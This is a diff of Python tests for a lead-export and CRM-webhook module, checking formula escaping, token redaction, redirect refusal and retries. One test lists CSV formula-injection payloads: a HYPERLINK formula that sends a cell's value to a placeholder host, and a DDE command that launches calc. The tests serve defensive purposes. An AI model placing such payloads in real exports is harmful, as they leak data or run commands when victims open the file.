@@ -120,6 +120,20 @@ class TestFile:
         assert list(rows[0]) == list(lead_handoff.LeadCard.__dataclass_fields__)
         assert rows[0]["advertiser"] == "brand.test"
 
+    @pytest.mark.parametrize(
+        "evil",
+        ['=HYPERLINK("https://x.test/?"&B2,"click")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)"],
+    )
+    def test_formula_from_a_strangers_letter_is_inert(self, evil: str) -> None:
+        """Текст ответа — из чужого письма; формула в нём при открытии выгрузки
+        в Excel или Google Sheets вытащила бы адреса соседних лидов (OWASP)."""
+        rows = list(
+            csv.DictReader(io.StringIO(lead_handoff.to_csv([_card(text=evil, subject=evil)])))
+        )
+        assert rows[0]["text"] == f"'{evil}"
+        assert rows[0]["subject"] == f"'{evil}"
+        assert rows[0]["advertiser"] == "brand.test"  # обычные ячейки не тронуты
+
 
 class TestWebhook:
     def test_signature_is_checkable_by_the_receiver(self) -> None:
@@ -157,15 +171,63 @@ class TestWebhook:
                 await lead_handoff.deliver(_card(), http, event_id="lead-7")
         assert is_permanent(refused.value)
 
-    @pytest.mark.usefixtures("hook")
     @pytest.mark.parametrize("code", [408, 429, 500, 503])
-    async def test_server_trouble_is_retried(self, code: int) -> None:
+    async def test_server_trouble_is_retried_without_the_address(
+        self, code: int, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """Адрес вебхука несёт токен CRM (Bitrix24 — в пути, Make/Zapier — в
+        параметрах), а текст ошибки задачи уходит в журнал и на экран задач:
+        адреса в нём быть не должно (ревью «Продаж» #160)."""
+        token_url = "https://crm.example.test/rest/1/SECRETTOKEN/crm.lead.add.json?key=QSECRET"
+        monkeypatch.setattr(outreach_cfg, "LEAD_WEBHOOK_URL", token_url)
+        monkeypatch.setattr(outreach_cfg, "LEAD_WEBHOOK_SECRET", HOOK_SECRET)
         async with httpx.AsyncClient(
             transport=httpx.MockTransport(lambda r: httpx.Response(code, request=r))
         ) as http:
-            with pytest.raises(httpx.HTTPStatusError) as failed:
+            with pytest.raises(lead_handoff.LeadWebhookUnavailableError) as failed:
                 await lead_handoff.deliver(_card(), http, event_id="lead-7")
         assert not is_permanent(failed.value)
+        assert "SECRETTOKEN" not in str(failed.value)
+        assert "QSECRET" not in str(failed.value)
+
+    @pytest.mark.usefixtures("hook")
+    async def test_network_trouble_is_retried_without_the_address(self) -> None:
+        def down(request: httpx.Request) -> httpx.Response:
+            raise httpx.ConnectError(f"cannot reach {request.url}", request=request)
+
+        async with httpx.AsyncClient(transport=httpx.MockTransport(down)) as http:
+            with pytest.raises(lead_handoff.LeadWebhookUnavailableError) as failed:
+                await lead_handoff.deliver(_card(), http, event_id="lead-7")
+        assert HOOK not in str(failed.value)
+        assert failed.value.__cause__ is None  # текст httpx с адресом не тянется следом
+
+    @pytest.mark.usefixtures("hook")
+    async def test_repeat_already_accepted_is_delivered(self) -> None:
+        """409 — получатель уже принял это событие: наш повтор застал его принятым."""
+        async with httpx.AsyncClient(
+            transport=httpx.MockTransport(lambda r: httpx.Response(409, request=r))
+        ) as http:
+            assert await lead_handoff.deliver(_card(), http, event_id="lead-7") == 409
+
+    @pytest.mark.usefixtures("hook")
+    async def test_redirect_is_a_setup_error_and_not_followed(self) -> None:
+        seen: list[str] = []
+
+        def moved(request: httpx.Request) -> httpx.Response:
+            seen.append(str(request.url))
+            return httpx.Response(302, headers={"location": "https://evil.test/"}, request=request)
+
+        async with httpx.AsyncClient(transport=httpx.MockTransport(moved)) as http:
+            with pytest.raises(lead_handoff.LeadWebhookRefusedError, match="перенаправляет"):
+                await lead_handoff.deliver(_card(), http, event_id="lead-7")
+        assert seen == [HOOK]  # подпись не ушла на чужой хост
+
+    async def test_plain_http_is_refused(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        monkeypatch.setattr(outreach_cfg, "LEAD_WEBHOOK_URL", "http://crm.example.test/hook")
+        monkeypatch.setattr(outreach_cfg, "LEAD_WEBHOOK_SECRET", HOOK_SECRET)
+        async with httpx.AsyncClient() as http:
+            with pytest.raises(lead_handoff.LeadWebhookRefusedError, match="https"):
+                await lead_handoff.deliver(_card(), http, event_id="lead-7")
 
     async def test_no_address_is_final(self, monkeypatch: pytest.MonkeyPatch) -> None:
         monkeypatch.setattr(outreach_cfg, "LEAD_WEBHOOK_URL", "")
@@ -251,5 +313,6 @@ class TestScreen:
         assert got.status_code == 200, got.text
         assert got.headers["content-type"].startswith("text/csv")
         assert got.headers["x-export-rows"] == "1"
+        assert got.headers["x-export-truncated"] == "0"
         rows = list(csv.DictReader(io.StringIO(got.text)))
         assert rows[0]["lead_id"] == str(reply_id)
